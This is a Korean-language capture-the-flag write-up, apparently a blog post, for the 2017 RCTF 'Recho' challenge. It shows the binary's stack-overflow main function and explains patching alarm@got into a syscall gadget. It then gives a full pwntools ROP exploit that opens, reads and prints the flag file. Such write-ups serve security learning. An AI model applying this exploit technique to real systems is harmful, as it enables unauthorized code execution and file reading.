---
title: "2017 RCTF Recho"
date: 2019-1-3
tags: [RCTF]
categories: [RCTF]
---

64비트 바이너리가 주어진다.

```
Recho: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=6696795a3d110750d6229d85238cad1a67892298, not stripped
```

메인에서는 원하는만큼 크기를 정하고 그 크기만큼 입력받을 수 있다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char nptr; // [rsp+0h] [rbp-40h]
  char buf[40]; // [rsp+10h] [rbp-30h]
  int v6; // [rsp+38h] [rbp-8h]
  int v7; // [rsp+3Ch] [rbp-4h]

  Init();
  write(1, "Welcome to Recho server!\n", 0x19uLL);
  while ( read(0, &nptr, 0x10uLL) > 0 )
  {
    v7 = atoi(&nptr);
    if ( v7 <= 15 )
      v7 = 16;
    v6 = read(0, buf, v7);
    buf[v6] = 0;
    printf("%s", buf);
  }
  return 0;
}
```

flag라는 파일을 읽어오는 문제다. 근데 .data 영역에 flag라는 문자열이 존재했다.

flag라는 파일을 읽기 위한 함수가 딱히 존재하지 않았다. 그냥 syscall을 이용해서 orw해주면 되는 문제다.

근데 int 0x80이 바이너리 내에 존재하지 않는다. 나 같은 경우에는 alarm함수의 syscall을 이용했다.

![](https://user-images.githubusercontent.com/32904385/71731844-12db9880-2e89-11ea-83d5-b54405616f5b.png)

alarm+5 위치에 syscall이 존재했다. `add byte ptr [rdi], al ; ret` 가젯을 이용해서 rdi에 alarm@got를 넣어주고 al 값에 5를 넣어주고 alarm을 호출하면 syscall이 호출될 것이다. 이를 이용해서 orw를 해주면 된다.

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./Recho')
p = process('./Recho')
prdi = 0x00000000004008a3 # pop rdi ; ret
prax = 0x00000000004006fc # pop rax ; ret
add_rdi_al = 0x000000000040070d # add byte ptr [rdi], al ; ret
prsi_r15 = 0x00000000004008a1 # pop rsi ; pop r15 ; ret
prdx = 0x00000000004006fe # pop rdx ; ret
flag = 0x0000000000601058
syscall = e.plt['alarm']

# alarm+5 syscall
payload = 'A'*48
payload += 'realsung'
payload += p64(prdi) + p64(e.got['alarm'])
payload += p64(prax) + p64(0x5) + p64(add_rdi_al)

# sys_open(flag,0,0)
payload += p64(prdi) + p64(flag)
payload += p64(prsi_r15) + p64(0) + p64(0)
payload += p64(prdx) + p64(0)
payload += p64(prax) + p64(0x2) + p64(syscall)

# sys_read(3,bss,100)
payload += p64(prdi) + p64(3)
payload += p64(prsi_r15) + p64(e.bss()) + p64(0)
payload += p64(prdx) + p64(100)
payload += p64(prax) + p64(0) + p64(syscall)

# sys_write(1,bss,100)
payload += p64(prdi) + p64(1)
payload += p64(prsi_r15) + p64(e.bss()) + p64(0)
payload += p64(prdx) + p64(100)
payload += p64(prax) + p64(1) + p64(syscall)

p.sendlineafter('server!\n',str(1000))
p.send(payload)

p.shutdown()
p.interactive()
```

